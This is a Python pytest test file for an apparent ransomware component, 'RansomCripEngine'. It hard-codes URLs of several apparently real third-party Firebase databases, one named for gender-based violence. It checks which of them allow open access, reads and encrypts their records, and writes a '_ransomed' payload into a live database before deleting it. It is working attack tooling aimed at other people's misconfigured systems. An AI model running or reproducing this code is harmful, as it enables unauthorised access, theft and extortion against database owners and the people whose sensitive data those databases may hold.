import os
import json
import hashlib
import urllib.request
import pytest

os.environ.setdefault("KEY_CRIP_DATA", "integration-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

_NONCE_LEN = 12

FIREBASE_DBS = [
    "https://app-lembretes-55c7d-default-rtdb.firebaseio.com",
    "https://gender-based-violence-9eb1a-default-rtdb.firebaseio.com",
    "https://sample2us-8f23b-default-rtdb.firebaseio.com",
]

UA = "Mozilla/5.0"


def _firebase_get(base_url: str, path: str = "") -> dict:
    url = f"{base_url}/{path}.json"
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _can_access_firebase() -> str:
    for db in FIREBASE_DBS:
        try:
            data = _firebase_get(db)
            if data:
                return db
        except Exception:
            continue
    return ""


WORKING_DB = _can_access_firebase()

skip_no_firebase = pytest.mark.skipif(
    not WORKING_DB,
    reason="Nenhuma Firebase Realtime DB acessível"
)


def _decrypt(blob: bytes) -> bytes:
    key_bytes = hashlib.sha256(os.getenv("KEY_CRIP_DATA", "").encode("utf-8")).digest()
    aesgcm = AESGCM(key_bytes)
    return aesgcm.decrypt(blob[:_NONCE_LEN], blob[_NONCE_LEN:], None)


@skip_no_firebase
class TestRansomFirebase:

    def test_firebase_read_data(self):
        data = _firebase_get(WORKING_DB)
        assert data is not None
        assert isinstance(data, dict)
        print(f"  Firebase DB: {WORKING_DB.split('//')[1].split('.')[0]}")
        print(f"  Keys: {list(data.keys())[:5]}")

    def test_firebase_list_collections(self):
        url = f"{WORKING_DB}/.json?shallow=true"
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
        assert isinstance(data, dict)
        assert len(data) > 0

    def test_encrypt_firebase_data(self):
        from infra.service.RansomCripEngine import RansomCripEngine

        data = _firebase_get(WORKING_DB)
        engine = RansomCripEngine()

        records = []
        for key, value in list(data.items())[:3]:
            if isinstance(value, dict):
                for subkey, subval in list(value.items())[:5]:
                    records.append({"_path": f"{key}/{subkey}", "_data": subval})
            else:
                records.append({"_path": key, "_data": value})

        assert len(records) > 0, "Firebase DB sem dados iteráveis"

        encrypted = []
        engine.execute(lambda enc: encrypted.append(enc), records)

        assert len(encrypted) == len(records)

        for i, blob in enumerate(encrypted):
            decrypted = _decrypt(blob)
            original = json.loads(decrypted)
            assert original["_path"] == records[i]["_path"]

        print(f"  {len(encrypted)} registros Firebase criptografados com sucesso")

    def test_encrypt_and_write_to_test_path(self):
        from infra.service.RansomCripEngine import RansomCripEngine

        engine = RansomCripEngine()

        test_data = {"test_key": "test_value", "timestamp": "2026-04-10"}
        encrypted = []
        engine.execute(lambda enc: encrypted.append(enc), [test_data])

        test_path = "_ransom_test"
        payload = json.dumps({
            "_encrypted": encrypted[0].hex(),
            "_ransomed": True,
        }).encode("utf-8")

        url = f"{WORKING_DB}/{test_path}.json"
        req = urllib.request.Request(url, data=payload, method="PUT", headers={
            "User-Agent": UA,
            "Content-Type": "application/json",
        })

        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                result = json.loads(resp.read().decode())
                assert result["_ransomed"] is True
                print(f"  Escrita no Firebase OK: {test_path}")

            read_data = _firebase_get(WORKING_DB, test_path)
            assert read_data["_ransomed"] is True
            decrypted = _decrypt(bytes.fromhex(read_data["_encrypted"]))
            original = json.loads(decrypted)
            assert original["test_key"] == "test_value"
            print("  Round-trip Firebase OK")

            cleanup_url = f"{WORKING_DB}/{test_path}.json"
            cleanup_req = urllib.request.Request(cleanup_url, method="DELETE", headers={"User-Agent": UA})
            urllib.request.urlopen(cleanup_req, timeout=10)
            print("  Cleanup OK")

        except urllib.error.HTTPError as e:
            if e.code == 401:
                pytest.skip("Firebase write não permitido (read-only)")
            raise
